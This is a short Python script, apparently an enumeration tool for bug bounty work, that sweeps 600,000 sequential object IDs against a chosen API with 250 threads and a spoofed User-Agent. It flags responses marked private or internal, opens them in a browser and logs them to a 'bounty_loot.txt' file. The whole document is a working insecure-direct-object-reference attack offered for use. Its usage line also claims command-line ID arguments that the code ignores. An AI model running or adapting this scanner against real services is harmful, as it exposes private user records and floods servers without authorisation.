import sys, requests, math, webbrowser
from concurrent.futures import ThreadPoolExecutor
from lattice_bridge import get_meta, get_resonant_id

def connect_the_dots(start_id, end_id):
    phi = 1.618033988749895
    nodes = set()
    curr, idx = start_id, 1
    while curr <= end_id:
        nodes.add(int(curr))
        curr += max(1, (idx * phi))
        idx = 1 if idx > 144 else idx + 1
    return sorted(list(nodes))

META_DATA = get_meta()

def critical_strike(pid, base_url):
    # Abstracted endpoint to target any internal API structure
    url = f'{base_url}/{pid}'
    headers = {
        'User-Agent': f'Sovereign-Lattice-Sync/{META_DATA["nextVersion"]}',
        'X-Logic-Sync': 'true'
    }
    try:
        r = requests.get(url, headers=headers, timeout=1.5)
        if r.status_code == 200:
            data = r.json()
            # Generic logic fracture check: identifies internal/private state exposure
            if data.get('visibility') != 'public' or data.get('internal'):
                print(f'\n[!!!] CRITICAL HIT: {pid}')
                webbrowser.open_new_tab(url)
                with open('bounty_loot.txt', 'a') as f:
                    f.write(f'CRITICAL | {pid} | {url}\n')
    except: pass

if __name__ == '__main__':
    # Usage: python strike.py <BASE_API_URL> <START_ID> <END_ID>
    target_api = sys.argv[1] if len(sys.argv) > 1 else "https://api.target-endpoint.com"
    start, end = 85000000, 85600000
    targets = connect_the_dots(start, end)
    
    with ThreadPoolExecutor(max_workers=250) as executor:
        for t in targets:
            executor.submit(critical_strike, t, target_api)